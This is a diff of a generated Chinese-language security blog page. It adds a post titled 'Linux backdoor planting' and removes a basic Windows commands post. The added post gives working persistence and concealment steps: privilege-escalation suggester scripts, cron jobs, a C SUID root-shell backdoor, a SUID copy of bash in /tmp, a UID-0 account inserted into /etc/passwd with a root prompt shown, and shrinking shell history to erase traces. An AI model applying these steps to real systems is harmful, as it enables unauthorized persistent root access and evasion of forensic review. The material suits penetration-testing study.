@@ -64,6 +64,77 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-linux后门植入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" class="article-date">
+  <time datetime="2021-08-03T03:57:14.000Z" itemprop="datePublished">2021-08-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="linux后门植入"><a href="#linux后门植入" class="headerlink" title="linux后门植入"></a>linux后门植入</h1><h2 id="用脚本探测linux提权漏洞"><a href="#用脚本探测linux提权漏洞" class="headerlink" title="用脚本探测linux提权漏洞"></a>用脚本探测linux提权漏洞</h2><h4 id="windows漏洞探测脚本"><a href="#windows漏洞探测脚本" class="headerlink" title="windows漏洞探测脚本:"></a>windows漏洞探测脚本:</h4><p>python2和python3的区别:</p>
+<p><strong>python2 打印函数print不需要括号: print “hello”;python3打印函数需要print(“hello”)</strong></p>
+<p>python2-pip安装:</p>
+<p>python2 get-pip.py</p>
+<p>python3-pip安装:</p>
+<p>apt-get install python3-pip</p>
+<p>脚本使用:</p>
+<p>漏洞库位置: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022</a></p>
+<p>下载漏洞库:  python2 windows-exploit-suggester.py –update</p>
+<p>保存systeminfo信息: systeminfo &gt; sys.txt</p>
+<p>探测漏洞: python2 windows-exploit-suggester.py -i sys.txt -d 2021-03-28-mssb.xls</p>
+<h4 id="linux脚本探测"><a href="#linux脚本探测" class="headerlink" title="linux脚本探测:"></a>linux脚本探测:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下载:</span><br><span class="line">github: https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester</span><br><span class="line">下载: </span><br><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mzet-&#x2F;linux-exploit-suggester&#x2F;master&#x2F;linux-exploit-suggester.sh -O les.sh</span><br><span class="line">运行:</span><br><span class="line">.&#x2F;les.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="linux后门植入-1"><a href="#linux后门植入-1" class="headerlink" title="linux后门植入"></a>linux后门植入</h2><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务:"></a>计划任务:</h5><ol>
+<li><p>用命令的方式写计划任务</p>
+<p>crontab -e </p>
+<p>crontab -l     –&gt; 查看计划任务</p>
+</li>
+<li><p>再文件中写入计划任务</p>
+<p>文件位置: /etc/crontab</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute(分钟) (0 - 59)</span><br><span class="line"># |  .------------- hour(小时) (0 - 23)</span><br><span class="line"># |  |  .---------- day of month(每月的天数) (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12)(月份) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (每周的天数)(Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"></span><br><span class="line">* --&gt; 任意时间</span><br><span class="line">&#x2F; --&gt; 时间频率     *&#x2F;1 * * * * --&gt; 任意时间每隔1分钟执行一次</span><br><span class="line">- --&gt; 区间        0-20&#x2F;2 * * * * --&gt; 0-20分钟每隔两分钟执行一次</span><br><span class="line">, --&gt; 列表范围       1,5,7,9 * * * * --&gt; 第1,5,7,9分钟的之后执行一次</span><br></pre></td></tr></table></figure>
+
+<p>命令的形式:</p>
+<p>创建计划任务: crontab -e –&gt; * * * * * command</p>
+<p>删除计划任务: crontab -r  | crontab -ri    –&gt; -r 删除 -i 交互(问你是否删除)</p>
+<h5 id="创建suid后门"><a href="#创建suid后门" class="headerlink" title="创建suid后门:"></a>创建suid后门:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp: 存放临时文件的目录,具有高权限</span><br><span class="line">1. </span><br><span class="line">创建suid.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">main()&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">编译:</span><br><span class="line">gcc suid.c -o suid</span><br><span class="line">权限赋予:</span><br><span class="line">chmod 4777 suid</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">复制&#x2F;bin&#x2F;bash &gt; &#x2F;tmp&#x2F;shell</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="etc-passwd后门"><a href="#etc-passwd后门" class="headerlink" title="/etc/passwd后门:"></a>/etc/passwd后门:</h5><p>生成有效密码: openssl passwd 密码</p>
+<p>插入有效数据: echo 用户名:密码:0:0:system:/root:/bin/bash</p>
+<p>登入用户:su 用户名</p>
+<p>┌─[✗]─[ilu@parrot]─[/tmp]<br>            └──╼ $su hello<br>                密码：<br>        ┌─[root@parrot]─[/tmp]<br>        └──╼ #</p>
+<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;原数量(默认1000)&#x2F;HISTSIZE&#x3D;目标数量&#x2F;&#39; ~&#x2F;.bashrc</span><br><span class="line">-i 进入到编辑模式</span><br><span class="line">s  替换模式</span><br><span class="line">d  删除模式</span><br><span class="line">g  全局匹配</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckrvj9685000808vjats18n7u" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-linux提权" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/" class="article-date">
@@ -122,7 +193,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckrsvrhxb0007u0vj545vgpdp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckrvj9688000a08vje4rj1419" class="article-share-link">Share</a>
       
       
     </footer>
@@ -193,7 +264,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrsvrhxd000au0vj493ra2d7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrvj9689000b08vjcz2zfm36" class="article-share-link">Share</a>
       
       
     </footer>
@@ -279,7 +350,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckrsvrhxe000bu0vjgpgxhg6y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckrvj968b000c08vje13712nh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -338,7 +409,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckrsvrhxc0009u0vj5ilkg5q9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckrvj9687000908vj6ren2zcw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -456,7 +527,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckrsvrhx20001u0vj08n15p1w" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckrvj9670000108vjaxeo9h86" class="article-share-link">Share</a>
       
       
     </footer>
@@ -516,7 +587,7 @@ shellcode: 机器码(二进制,十六进制)
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#112;&#97;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;">&#112;&#97;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#112;&#97;&#x73;&#115;&#x77;&#111;&#x72;&#x64;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#49;">&#112;&#97;&#x73;&#115;&#x77;&#111;&#x72;&#x64;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#49;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -566,7 +637,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckrsvrhx40002u0vj17geggsi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckrvj9675000208vj2ftverns" class="article-share-link">Share</a>
       
       
     </footer>
@@ -624,7 +695,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckrsvrhxa0006u0vj42hwecvl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckrvj967q000608vjaqdv8i9p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -734,7 +805,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrsvrhxf000cu0vj623m5849" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrvj968b000d08vj3aiw9vdd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -786,84 +857,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckrsvrhxh000eu0vj2uh83c3u" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-基础命令" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="article-date">
-  <time datetime="2021-07-10T04:11:26.000Z" itemprop="datePublished">2021-07-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">基础命令</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>net user                                      查看用户</p>
-<p>net user 用户名 密码                更改密码</p>
-<p>net user 用户名 密码 /add        创建用户</p>
-<p>net user 用户名 /active:yes       激活用户</p>
-<p>ipconfig                                     查看网络配置</p>
-<p>ipconfig /all</p>
-<p>ipconfig /release                        释放当前IP</p>
-<p>ipconfig /renew                          重新获取IP</p>
-<p>ipconfig /flushdns                      清除DNS缓存</p>
-<p>net localgroup                            查看本地用户组</p>
-<p>net localgroup 组名                   查看组下的成员信息</p>
-<p>netsh wlan show profiles wifi名 key=clear    查看wifi密码</p>
-<p>net start                                      查看运行的服务</p>
-<p>tasklist                                        查看进程列表</p>
-<p>taskkill                                        操作进程</p>
-<p>​        /IM    利用程序名杀死进程</p>
-<p>​        /PID   利用进程ID杀死进程</p>
-<p>​        /F        强制杀死进程</p>
-<p>​        /T        同时杀死子进程</p>
-<p>netstat -ano                                查看端口开放信息</p>
-<p>管道符：|</p>
-<p>重定向符：&gt;（重定向输入输出）、&gt;&gt;(追加)</p>
-<p>echo ‘’&gt; 文件名                                生成文件</p>
-<p>type 文件名                                     查看文件内容</p>
-<p>systeminfo                                       查看操作系统的基本配置</p>
-<p>findstr                                              匹配字符串</p>
-<p>at 时间点 命令                                计划任务</p>
-<p>chdir                                                 列出当前路径</p>
-<p><strong>windows不区分大小写，linux严格遵循大小写</strong></p>
-<p>whoami            看当前用户</p>
-<p>whoami /user   看用户的sid</p>
-<p>​    500：代表管理员</p>
-<p>​    1000+：普通用户</p>
-<p>常用端口：3306 – mysql数据库–&gt;php</p>
-<p>​                    445 – smb服务</p>
-<p>​                    80 – http（明文传输）</p>
-<p>​                    443 – https（加密传输）</p>
-<p>​                    21 – ftp</p>
-<p>​                    22 – ssh（加密传输）</p>
-<p>​                    23 – telnet （明文传输）</p>
-<p>​                    3389 – RDP（远程桌面协议）</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckrsvrhxg000du0vjaidi3qhk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckrvj968d000f08vj89x98aiu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -909,6 +903,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
           </li>
         
@@ -922,10 +920,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/">meterpreter与提权</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/20/MSF-meterpreter/">MSF--meterpreter</a>
           </li>
         
       </ul>
